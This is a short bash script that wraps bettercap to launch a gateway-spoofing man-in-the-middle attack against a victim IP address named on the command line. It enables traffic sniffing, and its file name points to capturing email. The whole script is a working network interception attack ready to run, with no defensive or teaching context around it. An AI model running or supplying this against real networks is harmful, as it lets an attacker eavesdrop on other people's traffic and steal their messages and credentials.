#!/bin/bash
# Usage: sudo ./bettercap_email.sh Victim_IP Gateway_IP
if [ "$#" -ne 2 ]; then
  echo "Usage: sudo $0 Victim_IP Gateway_IP"
  exit 1
fi
VICTIM=$1
GATEWAY=$2
echo "[*] Starting Bettercap gateway spoof for victim $VICTIM via gateway $GATEWAY"
sudo bettercap -T $VICTIM --gateway $GATEWAY -X


